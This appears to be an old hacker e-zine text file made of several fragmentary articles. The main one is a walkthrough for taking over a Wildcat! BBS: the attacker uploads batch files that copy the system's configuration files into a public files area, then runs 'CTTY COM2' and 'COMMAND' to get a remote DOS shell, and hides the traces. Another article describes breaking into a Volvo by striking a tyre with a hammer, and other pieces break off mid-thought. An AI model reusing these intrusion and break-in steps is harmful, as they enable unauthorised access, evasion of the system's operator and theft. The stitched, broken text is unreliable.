::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
::									      ::
:: Shelling into DOS on a Wildcat! 4.0 BBS is fairly easy should one be able  ::
:: to get co-sysop access to the board. Hard as it may sound, this is in fact ::
:: much easier than you would originally think it to be. By participating in  ::
:: the message boards, uploading often and being nice in general, it is quite ::
:: likely that the sysop will take a liking to you, and seriously consider    ::
:: doing so when you ask him for co-sysop access.			      ::
::									      ::
:: Of course, should he refuse, you'll just have to somehow hack yourself an  ::
:: account with co-sysop equivalence. But that isn't the point of this        ::
:: article, the point of this article is to tell you what to do *after* that. ::
:: The hack is a method originally thought up by RoBoTiC HaMSTeR which I      ::
:: found to be an unreliable system because of a very big problem which       ::
:: affected it.								      ::
::								              ::
:: The problem with his exploit, or rather, his style of using the exploit,   ::
:: was that you had to guess what COM port the Sysop's modem was on, and if   ::
:: you got it wrong - The System locked up, leaving the sysop to find his     ::
:: beloved BBS frozen in the morning, and a screen that has you trying to do  ::
:: evil things to it - Not a pleasant situation.			      ::
::									      ::
:: So, here's how to go about hacking a Wildcat! BBS in a method which takes a::
:: little bit longer, but is also a lot more stealthy and won't get you bust. ::
::								              ::
:: Go to the co-sysop menu by typing "1" at the menu prompt.		      ::
::									      ::
:: Run the "Even management" option. You should see a screen like this:       ::

:: And there you have it - the path for this installation of Wildcat! Now is  ::
:: where we start to get evil. ;) We know that that WC is in C:\WILDCAT and   ::
:: we will guess that their upload directory is C:\WILDCAT\UPLOAD and that the::
:: Misc Files Area is in C:\WILDCAT\MISC				      ::
::									      ::
:: Yes, this does mean that we have to do some guessing, but if we get it     ::
:: wrong, it won't freeze the BBS, so we can keep on trying, and besides,     ::
:: \MISC and \UPLOAD are bound to be there. Anyway... On with the show...     ::
::									      ::
:: We make a batch file with any name, for the purposes of this we will call  ::
:: it BEER.BAT, on our PC that contains the text:			      ::
::									      ::
::............................................................................::
:: COPY C:\AUTOEXEC.BAT C:\WILDCAT\MISC					      ::
:: COPY C:\CONFIG.SYS C:\WILDCAT\MISC					      ::
::............................................................................::
::									      ::
:: We then upload this to the files area of the BBS and go back to the Event  ::
:: Management Menu. We then press "A" to add a scheduled task, and add        ::
:: C:\WILDCAT\UPLOADS\BEER.BAT - You will then be dropped back to the Menu    ::
:: where you press [R] to run BEER.BAT straight away.                         ::
::									      ::
:: If you got the PATH for the Uploads directory wrong, you will see an error ::
:: message like...							      ::
::									      ::
:: System Error:						              ::
:: Sysop has been notified, you may continue...			              ::
::									      ::
:: And if you see nothing, then you have got it right, and the CONFIG.SYS and ::
:: AUTOEXEC.BAT for the BBS System should be in the "Miscallaneous Files" Dir ::
:: If they aren't, then you've guessed the name for that directory wrong - Try::
:: another one. And don't be alarmed by the sysop notifications. We will BE   ::
:: Sysop in a few minutes and we can delete them then.			      ::
::									      ::
:: Now, we take a look at the Sysop's AUTOEXEC.BAT and/or his CONFIG.SYS and  ::
:: Lo' and Behold, I can see what COM port his modem is on. :-) Just look for ::
:: dem horrible little FOSSIL drivers and it will probably be somewhere       ::
:: amongst the command-line parameters for them.			      ::
::								              ::
:: And now, the final step, we make another batch file on our PC's (Called    ::
:: YEEHAA.BAT in this example) and type the following into it                 ::
::									      ::
::............................................................................::
:: CTTY COM2							              ::
:: COMMAND								      ::
::............................................................................::
::									      ::
:: Of course, substituting COM2 for the COM port that the system's modem is   ::
:: on, since we went through all that trouble to find out. We then upload that::
:: file, run it in the same way we did our previous batch file, using the     ::
:: event manager and then...						      ::
::									      ::
:: C:\WILDCAT>								      ::
::									      ::
:: Be good. ;-) 							      ::

:: Just another trick to get into a car by Flashfire. This time its the new   ::
:: Volvo Coupe. (The small one that *doesnt* look square)		      ::
::									      ::
:: Do this :								      ::
::									      ::
:: * Find a volvo coupe !						      ::
:: * Take along a nice heavy 5 kilo hammer				      ::
:: * Sit in the bushes until its dark					      ::
:: * Leap out and with the strength of ten titans whack a tyre on the tred.   ::
::   (The tread, not the wall) 						      ::
::									      ::
:: Unless you're kinda wimpy or you fell asleep in the bushes and you've just ::
:: hit a toddler instead of the volvo, the locks on the doors will pop up.    ::
::									      ::
:: This feature was made possible by the kind people at Volvo. They reckon    ::
:: that if you are in an accident and are knocked unconscious, the para-medics::
:: wont have to cut open your car to get to you (and avoid the whole          ::
:: possibility of then cutting your arm off too) Well this is great news since::
:: we all know how all the other car maker types copy Volvo's saftey features.::
::								              ::
:: Hopefuly there will be soon loads of other cars that we can do this to...  ::

:: This article is actually being written by wyze1, but it's a trick I learnt ::

:: The buses actually transmit their locations in real time... so they will   ::
:: know where you are (unless you jam the signal somehow - anybody want to    ::

:: Ok, yes there is even more on this obnoxious, stupid prick.  Doxx.net hosts::

:: a while later he cuts them all, says they are taking too many system       ::
:: resources.  Ok now this I can handle, they were free, its his box, he has  ::
:: every right to kill them.  But heres the problem, he gives no warning and  ::
:: he closes them without giving anyone the chance to retrieve their data,    ::
:: later after taking some heavy flak over this, he says email me and I will  ::
:: send you the stuff from your shells, I have it all on tape backup.         ::
::									      ::
:: HOWEVER, when certain people emailed him for their web pages, their data   ::
